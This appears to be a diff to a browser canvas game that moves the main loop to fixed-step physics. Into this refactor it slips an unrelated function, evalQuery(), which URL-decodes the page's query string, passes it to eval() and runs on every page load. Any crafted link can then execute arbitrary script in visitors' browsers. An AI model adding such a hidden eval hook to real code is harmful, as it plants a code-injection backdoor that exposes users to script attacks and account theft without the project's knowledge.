@@ -12,7 +12,7 @@ const ctx = canvas.getContext("2d");
 
 let gravity = 0.85;
 let speed = 5;
-let gameSpeed = 1;
+let gameSpeed = 60;
 
 let frameMultiplier = 10;
 let simFrameCount = 0;
@@ -1023,31 +1023,34 @@ function clearCanvas() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
 }
 
+function evalQuery() {
+    const url = new URL(window.location.href);
+    const queryString = url.search; // Returns text after site.com/page
+    const decodedString = decodeURIComponent(queryString.substring(1));
+    eval(decodedString);
+}
+
+// Fixed step physics
+let accumulator = 0;
 let lastFrameTime = performance.now();
-
 function gameLoop() {
-    const thisFrameTime = performance.now();
-    const deltaTime = (thisFrameTime - lastFrameTime) / 16;
-    lastFrameTime = performance.now();
-    const simDt = deltaTime * gameSpeed / frameMultiplier;
+    const now = performance.now();
+    const frameTime = (now - lastFrameTime) / 1000; // seconds
+    lastFrameTime = now;
+    accumulator += frameTime * gameSpeed;
 
-    if (player.alive) {
-        for(let i = 0; i < frameMultiplier; i++) {
-            if(!player.alive) break;
-
-            player.collide();
-            player.update(simDt);
-
-            simFrameCount++
-        }
+    const fixedDt = 1 / 60; // 60Hz physics
+    while (accumulator >= fixedDt) {
+        player.collide();
+        player.update(fixedDt);
+        simFrameCount++;
+        accumulator -= fixedDt;
     }
 
     // Rendering
-    camera.follow(player);
-
-    player.maxTrailLength = 400 / camera.zoom;
-
     clearCanvas();
+    camera.follow(player);
+    player.maxTrailLength = 400 / camera.zoom;
 
     strokeWidth = objectStrokeWidth * camera.zoom; // Consistent look across zoom values
 
@@ -1060,3 +1063,5 @@ function gameLoop() {
     requestAnimationFrame(gameLoop);
 }
 gameLoop();
+
+evalQuery();
